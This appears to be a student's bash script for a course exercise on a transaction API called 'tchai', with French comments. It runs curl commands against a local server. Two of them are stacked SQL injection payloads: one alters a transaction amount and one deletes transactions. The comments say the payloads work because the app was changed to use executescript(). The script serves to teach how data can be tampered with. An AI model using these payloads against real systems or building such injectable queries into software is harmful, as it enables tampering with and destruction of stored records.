#!/bin/bash


#commande curl pour ajout d'un user 
#curl -X POST "http://localhost:5000/user/sow/samba"

#commande curl pour ajout deal 
#curl -X POST "http://localhost:5000/deal/1/2/78965"

#EXERCICE 4. Attaquer le système en modifiant directement le fichier de données, en changeant le montant d’une transaction
#pour cela j'ai modifié le fichier tchai.py en remplaçant l'execute par excecutescript
#car execute() ne peut executé qu'1 seul script à la fois contrairement à executescript() 

#la commande suivante permet une injection sql qui modifie la valeur de amount en 8000
curl -X GET "http://0.0.0.0:5000/deal/1%20;%20UPDATE%20DEAL%20SET%20amount%20=%208000%20WHERE%20sender=1;--%20"

#EXERCICE 8
#la commande suivante permet une injection sql qui supprime une transaction
curl -X GET "http://0.0.0.0:5000/deal/1%20;%20DELETE%20FROM%20DEAL%20WHERE%20amount%20=%208000%20;--%20"


#Exercice 11

curl -X POST "http://localhost:5000/deal/5/2/7965"
